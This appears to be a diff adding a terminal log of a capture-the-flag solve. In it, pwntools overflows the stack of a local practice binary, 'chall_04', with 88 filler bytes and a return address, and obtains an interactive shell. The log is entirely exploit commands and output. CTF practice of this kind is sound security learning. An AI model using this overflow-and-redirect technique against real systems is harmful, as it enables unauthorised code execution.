@@ -1,0 +1,21 @@
+──(kali㉿kali)-[~/pwns/chall_04]
+└─$ python           ------------------------------------------------------------------->  Command       
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *   ------------------------------------------------------------------->  Command   
+>>> p = process('./chall_04')  ------------------------------------------------------------------->  Command   
+[x] Starting local process './chall_04'
+[+] Starting local process './chall_04': pid 56708
+>>> p.recv()  ------------------------------------------------------------------->  Command   
+b"Follow the compass and it'll point you in the right direction\n"
+>>> rec=_  ------------------------------------------------------------------->  Command   
+>>> rec  ------------------------------------------------------------------->  Command   
+b"Follow the compass and it'll point you in the right direction\n"
+>>> payload=88*b'A'  ------------------------------------------------------------------->  Command   
+>>> payload+=p64(0x00401176)  ------------------------------------------------------------------->  Command   
+>>> p.sendline(payload)  ------------------------------------------------------------------->  Command   
+>>> p.interactive()  ------------------------------------------------------------------->  Command   
+[*] Switching to interactive mode
+whoami
+kali
+
